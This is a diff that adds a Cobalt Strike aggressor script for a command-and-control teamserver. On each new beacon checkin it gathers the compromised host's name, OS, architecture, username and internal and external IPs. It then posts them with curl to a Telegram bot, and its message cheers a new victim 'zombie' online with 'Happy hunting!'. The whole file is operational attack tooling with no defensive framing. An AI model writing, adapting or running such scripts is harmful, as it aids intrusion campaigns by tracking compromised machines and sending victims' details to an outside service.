@@ -1,0 +1,36 @@
+# Telegram bot setting
+$bot_token = "";
+# id for private channel/group, or @name for public channel
+$chat_id = '-1001424924018';     
+$tg_bot_webhookURL = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
+
+# teamserver setting
+$teamserver = 'Main C2 Server'; 
+
+# send a checkin message, so can verify the script and telegram bot is working properly.
+$checkin_message = 'The aggressor script loaded successfully, also the telegram bot is working properly!';
+@curl_command = @('curl', '-X', 'POST', '--data-urlencode', 'chat_id='.$chat_id, '--data-urlencode', 'text='.$checkin_message, $tg_bot_webhookURL);
+exec(@curl_command);
+
+on beacon_initial {
+    println("\c3Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1, "pid"));
+    local('$internalIP $computerName $userName');
+    $internalIP = beacon_info($1, "internal");
+    $computerName = beacon_info($1, "computer");
+    $osType = beacon_info($1, "os");
+    $arch = beacon_info($1, "barch");
+    $userName = beacon_info($1, "user");
+    $extenalIP = beacon_info($1, "external");
+
+    $message = "你有新肉鸡小可爱已上线! Happy hunting!" ."\n" .
+    "C2 Server: " . $teamserver ."\n" . 
+    "Hostname: " .$computerName ."\n" . 
+    "OS: " .$osType ."\n" .
+    "Arch: " .$arch ."\n" .
+    "Username: " .$userName ."\n" .
+    "Internal IP: " .$internalIP ."\n" .
+    "External IP: " .$extenalIP ."\n" ;
+
+    @curl_command = @('curl', '-X', 'POST', '--data-urlencode', 'chat_id='.$chat_id, '--data-urlencode', 'text='.$message, $tg_bot_webhookURL);
+    exec(@curl_command);
+}
